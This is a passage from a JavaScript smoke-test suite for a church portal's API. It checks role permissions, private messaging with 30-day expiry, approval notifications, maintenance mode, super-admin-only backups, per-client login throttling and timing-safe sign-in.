    assert.equal(inbox.status, 200, `custom role reads inbox → ${inbox.status}`);
    const write = await fetch(`${BASE}/admin/events`, {
      method: "POST",
      headers: as(person.accessToken),
      body: JSON.stringify({}),
    });
    assert.equal(write.status, 403, `custom role writes content → ${write.status}`);

    // Editing the role applies on the very next request.
    const edited = await fetch(`${BASE}/admin/roles/${role.key}`, {
      method: "PATCH",
      headers: as(admin.accessToken),
      body: JSON.stringify({ permissions: ["content.read"] }),
    });
    assert.equal(edited.status, 200, `edit role → ${edited.status}`);
    const after = await fetch(`${BASE}/admin/contact-messages`, { headers: as(person.accessToken) });
    assert.equal(after.status, 403, `inbox after permission removed → ${after.status}`);

    // A role in use cannot be deleted; built-ins cannot be edited.
    const busy = await fetch(`${BASE}/admin/roles/${role.key}`, {
      method: "DELETE",
      headers: as(admin.accessToken),
    });
    assert.equal(busy.status, 409, `delete held role → ${busy.status}`);
    const builtIn = await fetch(`${BASE}/admin/roles/editor`, {
      method: "PATCH",
      headers: as(admin.accessToken),
      body: JSON.stringify({ permissions: ["content.read"] }),
    });
    assert.equal(builtIn.status, 400, `edit built-in → ${builtIn.status}`);

    // Deleting live content needs publish rights even with content.delete.
    const deleter = await json(
      await fetch(`${BASE}/admin/roles`, {
        method: "POST",
        headers: as(admin.accessToken),
        body: JSON.stringify({ name: "Tidy Up", permissions: ["content.read", "content.write", "content.delete"] }),
      }),
    );
    await fetch(`${BASE}/admin/users`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({ name: "Tidy Person", email: "tidy@example.org", password: "Password@123", role: deleter.key }),
    });
    const tidy = await login("tidy@example.org");
    const liveEvent = (await json(await fetch(`${BASE}/events`)))[0];
    const delLive = await fetch(`${BASE}/admin/events/${liveEvent.id}`, {
      method: "DELETE",
      headers: as(tidy.accessToken),
    });
    assert.equal(delLive.status, 403, `delete live without publish → ${delLive.status}`);
    const draft = await json(
      await fetch(`${BASE}/admin/announcements`, {
        method: "POST",
        headers: as(tidy.accessToken),
        body: JSON.stringify({
          title: { en: "Tidy draft", ta: "வரைவு" },
          body: { en: "Draft body", ta: "வரைவு" },
          publishedAt: "2026-11-20",
        }),
      }),
    );
    const delDraft = await fetch(`${BASE}/admin/announcements/${draft.id}`, {
      method: "DELETE",
      headers: as(tidy.accessToken),
    });
    assert.equal(delDraft.status, 204, `delete own draft → ${delDraft.status}`);
  });

  /*
   * Direct messages between accounts (church request, 23 Nov 2026). Any
   * signed-in account can message any other; a conversation is readable by
   * its two participants only - not even a super admin can open someone
   * else's.
   */
  await check("Messages: send, unread, read, and private to the pair", async () => {
    const signIn = async (email) =>
      json(
        await fetch(`${BASE}/auth/login`, {
          method: "POST",
          headers: { "Content-Type": "application/json", "X-Forwarded-For": "203.0.113.77" },
          body: JSON.stringify({ email, password: "Password@123" }),
        }),
      );
    const as = (token) => ({ Authorization: `Bearer ${token}`, "Content-Type": "application/json" });
    for (const [name, email, role] of [
      ["Chat Anna", "anna@example.org", "editor"],
      ["Chat Ben", "ben@example.org", "viewer"],
    ]) {
      await fetch(`${BASE}/admin/users`, {
        method: "POST",
        headers: auth(),
        body: JSON.stringify({ name, email, password: "Password@123", role }),
      });
    }
    const anna = await signIn("anna@example.org");
    const ben = await signIn("ben@example.org");

    // A viewer - the least-privileged role - can still see who to message.
    const contacts = await json(await fetch(`${BASE}/admin/chat/contacts`, { headers: as(ben.accessToken) }));
    assert(contacts.some((c) => c.id === anna.user.id), "contacts should list other accounts");
    assert(!contacts.some((c) => c.id === ben.user.id), "contacts must not include yourself");
    assert(contacts.every((c) => !("email" in c)), "contacts expose names, not email addresses");

    const self = await fetch(`${BASE}/admin/chat/conversations`, {
      method: "POST",
      headers: as(anna.accessToken),
      body: JSON.stringify({ userId: anna.user.id }),
    });
    assert.equal(self.status, 400, `message yourself → ${self.status}`);

    const conv = await json(
      await fetch(`${BASE}/admin/chat/conversations`, {
        method: "POST",
        headers: as(anna.accessToken),
        body: JSON.stringify({ userId: ben.user.id }),
      }),
    );
    assert.equal(conv.with.id, ben.user.id);

    // Opening it from the other side finds the same conversation.
    const same = await json(
      await fetch(`${BASE}/admin/chat/conversations`, {
        method: "POST",
        headers: as(ben.accessToken),
        body: JSON.stringify({ userId: anna.user.id }),
      }),
    );
    assert.equal(same.id, conv.id, "one conversation per pair");

    const empty = await fetch(`${BASE}/admin/chat/conversations/${conv.id}/messages`, {
      method: "POST",
      headers: as(anna.accessToken),
      body: JSON.stringify({ body: "   " }),
    });
    assert.equal(empty.status, 400, `blank message → ${empty.status}`);

    for (const body of ["Hello Ben", "Are you coming on Sunday?"]) {
      const sent = await fetch(`${BASE}/admin/chat/conversations/${conv.id}/messages`, {
        method: "POST",
        headers: as(anna.accessToken),
        body: JSON.stringify({ body }),
      });
      assert.equal(sent.status, 201, `send → ${sent.status}`);
    }

    const benUnread = await json(await fetch(`${BASE}/admin/chat/unread`, { headers: as(ben.accessToken) }));
    assert.equal(benUnread.total, 2, "recipient sees two unread");
    const annaUnread = await json(await fetch(`${BASE}/admin/chat/unread`, { headers: as(anna.accessToken) }));
    assert.equal(annaUnread.total, 0, "your own messages are never unread");

    const list = await json(await fetch(`${BASE}/admin/chat/conversations`, { headers: as(ben.accessToken) }));
    assert.equal(list[0].id, conv.id);
    assert.equal(list[0].lastMessage.body, "Are you coming on Sunday?");
    assert.equal(list[0].unread, 2);

    const thread = await json(
      await fetch(`${BASE}/admin/chat/conversations/${conv.id}/messages`, { headers: as(ben.accessToken) }),
    );
    assert.deepEqual(thread.map((m) => m.body), ["Hello Ben", "Are you coming on Sunday?"], "oldest first");
    const newer = await json(
      await fetch(
        `${BASE}/admin/chat/conversations/${conv.id}/messages?after=${encodeURIComponent(thread[0].createdAt)}`,
        { headers: as(ben.accessToken) },
      ),
    );
    assert.deepEqual(newer.map((m) => m.body), ["Are you coming on Sunday?"], "after= returns only newer");

    await fetch(`${BASE}/admin/chat/conversations/${conv.id}/read`, { method: "POST", headers: as(ben.accessToken) });
    const afterRead = await json(await fetch(`${BASE}/admin/chat/unread`, { headers: as(ben.accessToken) }));
    assert.equal(afterRead.total, 0, "reading clears unread");

    // Auto-deletion after 30 days: TTL indexes do the deleting; until the
    // monitor's next sweep, anything past the cut-off is already hidden.
    const { MongoClient } = require("mongodb");
    const client = await MongoClient.connect(mongo.getUri());
    try {
      const db = client.db("csistmc-portal");
      const ttl = (await db.collection("chat_messages").indexes()).find(
        (index) => index.key.createdAt === 1 && index.expireAfterSeconds,
      );
      assert.equal(ttl?.expireAfterSeconds, 30 * 86_400, "messages expire after 30 days");
      const convTtl = (await db.collection("chat_conversations").indexes()).find(
        (index) => index.key["lastMessage.createdAt"] === 1 && index.expireAfterSeconds,
      );
      assert.equal(convTtl?.expireAfterSeconds, 30 * 86_400, "conversations expire with their last message");

      await db.collection("chat_messages").insertOne({
        conversationId: conv.id,
        senderId: anna.user.id,
        body: "An old message",
        createdAt: new Date(Date.now() - 31 * 86_400_000),
      });
    } finally {
      await client.close();
    }
    const withOld = await json(
      await fetch(`${BASE}/admin/chat/conversations/${conv.id}/messages`, { headers: as(ben.accessToken) }),
    );
    assert(!withOld.some((m) => m.body === "An old message"), "a 31-day-old message is never shown");
    const stillRead = await json(await fetch(`${BASE}/admin/chat/unread`, { headers: as(ben.accessToken) }));
    assert.equal(stillRead.total, 0, "an expired message is never counted unread");

    // Private: the super admin is not in the conversation and cannot open it.
    const snoop = await fetch(`${BASE}/admin/chat/conversations/${conv.id}/messages`, { headers: auth() });
    assert.equal(snoop.status, 404, `outsider reading a conversation → ${snoop.status}`);
    const snoopSend = await fetch(`${BASE}/admin/chat/conversations/${conv.id}/messages`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({ body: "hi" }),
    });
    assert.equal(snoopSend.status, 404, `outsider writing → ${snoopSend.status}`);
  });

  /*
   * Notifications for the approval workflow (church request, 23 Nov 2026):
   * approvers hear about submissions, writers hear the outcome.
   */
  await check("Notifications: submitted, approved, changes, rejected", async () => {
    await fetch(`${BASE}/admin/users`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({ name: "Noti Editor", email: "noti@example.org", password: "Password@123", role: "editor" }),
    });
    const ed = await json(
      await fetch(`${BASE}/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json", "X-Forwarded-For": "203.0.113.120" },
        body: JSON.stringify({ email: "noti@example.org", password: "Password@123" }),
      }),
    );
    const asEd = { Authorization: `Bearer ${ed.accessToken}`, "Content-Type": "application/json" };
    const mine = async (headers) => json(await fetch(`${BASE}/admin/notifications`, { headers }));
    const unread = async (headers) =>
      (await json(await fetch(`${BASE}/admin/notifications/unread`, { headers }))).total;
    const adminBefore = await unread(auth());

    // 1. Editor submits a new item → approvers are told.
    const item = await json(
      await fetch(`${BASE}/admin/announcements`, {
        method: "POST",
        headers: asEd,
        body: JSON.stringify({
          title: { en: "Choir practice moved", ta: "பாடகர் பயிற்சி மாற்றம்" },
          body: { en: "Practice is on Friday this week.", ta: "இந்த வாரம் வெள்ளிக்கிழமை." },
          publishedAt: "2026-11-22",
          status: "pending",
        }),
      }),
    );
    assert.equal(await unread(auth()), adminBefore + 1, "approver notified of a submission");
    const [submitted] = await mine(auth());
    assert.equal(submitted.kind, "submitted");
    assert.equal(submitted.link, `/announcements/${item.id}`);
    assert(submitted.title.includes("Noti Editor"), submitted.title);
    assert.equal(await unread(asEd), 0, "no one is notified of their own action");

    // 2. Admin approves → the writer is told.
    await fetch(`${BASE}/admin/announcements/${item.id}/status`, {
      method: "PATCH",
      headers: auth(),
      body: JSON.stringify({ status: "published" }),
    });
    const [approved] = await mine(asEd);
    assert.equal(approved.kind, "approved", "writer told it was approved");

    // 3. Writer changes the live item → approvers told; 4. rejected → writer told.
    await fetch(`${BASE}/admin/announcements/${item.id}`, {
      method: "PATCH",
      headers: asEd,
      body: JSON.stringify({ title: { en: "Choir practice moved to Friday", ta: "வெள்ளிக்கிழமை" } }),
    });
    assert.equal((await mine(auth()))[0].kind, "changes-submitted", "approver told of changes");
    await fetch(`${BASE}/admin/announcements/${item.id}/revision/reject`, { method: "POST", headers: auth() });
    const [rejected] = await mine(asEd);
    assert.equal(rejected.kind, "rejected", "writer told the changes were rejected");
    assert.equal(await unread(asEd), 2);

    // Reading: one, then all; nobody can touch another person's.
    const forbidden = await fetch(`${BASE}/admin/notifications/${rejected.id}/read`, {
      method: "POST",
      headers: auth(),
    });
    assert.equal(forbidden.status, 404, `marking someone else's → ${forbidden.status}`);
    await fetch(`${BASE}/admin/notifications/${rejected.id}/read`, { method: "POST", headers: asEd });
    assert.equal(await unread(asEd), 1);
    await fetch(`${BASE}/admin/notifications/read-all`, { method: "POST", headers: asEd });
    assert.equal(await unread(asEd), 0, "read-all clears the count");

    // Church pages too.
    await fetch(`${BASE}/admin/church/weekly-verse`, {
      method: "PUT",
      headers: asEd,
      body: JSON.stringify({
        reference: { en: "Psalm 46:10", ta: "சங்கீதம் 46:10" },
        text: { en: "Be still, and know that I am God.", ta: "அமர்ந்திருங்கள்." },
        weekOf: "2026-12-07",
      }),
    });
    const [churchNote] = await mine(auth());
    assert.equal(churchNote.kind, "changes-submitted");
    assert.equal(churchNote.link, "/church/weekly-verse");
    await fetch(`${BASE}/admin/church/weekly-verse/reject`, { method: "POST", headers: auth() });
    assert.equal((await mine(asEd))[0].kind, "rejected", "church rejection notifies the writer");
  });

  /*
   * Maintenance mode (church request, 23 Nov 2026): the Portal stores the
   * switch and serves it publicly; the Website will read it once deployed.
   */
  await check("Maintenance mode: public status, permission, switch on and off", async () => {
    const initial = await json(await fetch(`${BASE}/site/status`));
    assert.equal(initial.maintenance.enabled, false, "off by default");
    assert(initial.maintenance.message.en, "a default message is provided");

    const editorLogin = await json(
      await fetch(`${BASE}/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json", "X-Forwarded-For": "203.0.113.140" },
        body: JSON.stringify({ email: "editor@example.org", password: "Password@123" }),
      }),
    );
    const body = {
      enabled: true,
      message: { en: "Back after the Sunday service.", ta: "ஞாயிறு ஆராதனைக்குப் பின் திரும்பும்." },
      until: "2026-12-01T06:00:00.000Z",
    };
    const denied = await fetch(`${BASE}/admin/site/maintenance`, {
      method: "PUT",
      headers: { Authorization: `Bearer ${editorLogin.accessToken}`, "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    assert.equal(denied.status, 403, `editor switching maintenance → ${denied.status}`);

    // Super-admin only: an ordinary admin is refused too.
    const adminLogin = await json(
      await fetch(`${BASE}/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json", "X-Forwarded-For": "203.0.113.141" },
        body: JSON.stringify({ email: "roleadmin@example.org", password: "Password@123" }),
      }),
    );
    assert.equal(adminLogin.user.role, "admin");
    const adminDenied = await fetch(`${BASE}/admin/site/maintenance`, {
      method: "PUT",
      headers: { Authorization: `Bearer ${adminLogin.accessToken}`, "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    assert.equal(adminDenied.status, 403, `admin switching maintenance → ${adminDenied.status}`);

    const on = await fetch(`${BASE}/admin/site/maintenance`, {
      method: "PUT",
      headers: auth(),
      body: JSON.stringify(body),
    });
    assert.equal(on.status, 200, `admin switching on → ${on.status}`);
    const status = await fetch(`${BASE}/site/status`);
    assert.equal(status.headers.get("cache-control"), "no-store", "status must never be cached");
    const live = await json(status);
    assert.equal(live.maintenance.enabled, true);
    assert.equal(live.maintenance.message.en, "Back after the Sunday service.");
    assert.equal(live.maintenance.until, "2026-12-01T06:00:00.000Z");
    assert.equal(live.maintenance.updatedBy, undefined, "who switched it is not public");

    await fetch(`${BASE}/admin/site/maintenance`, {
      method: "PUT",
      headers: auth(),
      body: JSON.stringify({ ...body, enabled: false, until: null }),
    });
    const off = await json(await fetch(`${BASE}/site/status`));
    assert.equal(off.maintenance.enabled, false, "switched off again");
    assert.equal(off.maintenance.until, undefined, "until cleared");
  });

  await check("RBAC: not even an admin may back up or restore", async () => {
    await fetch(`${BASE}/admin/users`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({
        name: "Ordinary Admin",
        email: "admin2@example.org",
        password: "Password@123",
        role: "admin",
      }),
    });
    const login = await json(
      await fetch(`${BASE}/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: "admin2@example.org", password: "Password@123" }),
      }),
    );
    const asAdmin = {
      Authorization: `Bearer ${login.accessToken}`,
      "Content-Type": "application/json",
    };

    // Both halves are super-admin only. The archive is the whole database in
    // one file - an admin who can download it has every password hash in the
    // installation, whether or not they can put one back.
    const preview = await fetch(`${BASE}/admin/backup/preview`, { headers: asAdmin });
    assert.equal(preview.status, 403, `admin preview → ${preview.status}`);

    const build = await fetch(`${BASE}/admin/backup`, { method: "POST", headers: asAdmin });
    assert.equal(build.status, 403, `admin backup → ${build.status}`);

    const form = new FormData();
    form.append("file", new Blob([archive], { type: "application/zip" }), "backup.zip");
    const restore = await fetch(`${BASE}/admin/backup/restore`, {
      method: "POST",
      headers: { Authorization: `Bearer ${login.accessToken}` },
      body: form,
    });
    assert.equal(restore.status, 403, `admin restore → ${restore.status}`);
  });

  await check("Sign-in throttling is per client, not one bucket for everyone", async () => {
    /*
     * `trust proxy` was unset, so behind the container's router every request in
     * the world arrived as the same address and shared one 5/min bucket: a
     * single attacker could lock every administrator out of sign-in, and every
     * audit entry recorded the proxy instead of a person.
     */
    const login = (ip) =>
      fetch(`${BASE}/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json", "X-Forwarded-For": ip },
        body: JSON.stringify({ email: "admin@example.org", password: "wrong-password" }),
      });

    let throttled = false;
    for (let i = 0; i < 8; i += 1) {
      if ((await login("198.51.100.7")).status === 429) throttled = true;
    }
    assert(throttled, "repeated failures from one address were never throttled");

    // A different client must be unaffected by that one's exhausted budget.
    const other = await login("198.51.100.8");
    assert.equal(
      other.status,
      401,
      `a second client inherited the first's rate limit (${other.status})`,
    );
  });

  /*
   * Deliberately the last check in the suite.
   *
   * Sign-in is rate limited to 5 attempts a minute, and this spends several of
   * them on purpose. Run anywhere earlier it starves the logins the RBAC checks
   * need, and those fail with a confusing 401 - no token, because the login that
   * should have issued one was throttled.
   */
  await check("Sign-in takes the same time for unknown and known addresses", async () => {
    // Each attempt from its own address, so the shared sign-in bucket is left
    // alone and a rate limit can never be mistaken for a slow hash.
    let host = 0;
    const attempt = async (email) => {
      host += 1;
      const started = process.hrtime.bigint();
      const res = await fetch(`${BASE}/auth/login`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Forwarded-For": `203.0.113.${host}`,
        },
        body: JSON.stringify({ email, password: "definitely-not-the-password" }),
      });
      assert.equal(res.status, 401, `expected a rejected sign-in, got ${res.status}`);
      return Number(process.hrtime.bigint() - started) / 1e6;
    };

    // One warm-up: the first bcrypt call carries native-module setup cost that
    // would otherwise land entirely on whichever path ran first.
    await attempt("warmup@example.org");

    const known = await attempt("admin@example.org");
    const unknown = await attempt("nobody@example.org");

    /*
     * Before the decoy hash, an unknown address returned without touching
     * bcrypt at all - the gap was the whole cost of a hash, and a reliable way
     * to enumerate who holds an account. Asserting the ratio rather than a
     * millisecond figure keeps this meaningful on a slow machine.
     */
    const ratio = Math.max(known, unknown) / Math.max(1, Math.min(known, unknown));
    assert(
      ratio < 3,
      `timing gap reveals which accounts exist: known ${known.toFixed(0)}ms vs unknown ${unknown.toFixed(0)}ms`,
    );
  });

  await app.close();
  await mongo.stop();

  if (failures > 0) {
    console.error(`\n${failures} check(s) failed`);
    process.exit(1);
  }
  console.log("\nAll smoke checks passed ✔");
  process.exit(0);
}

main().catch((error) => {
  console.error("Smoke test crashed:", error);
  process.exit(1);
});
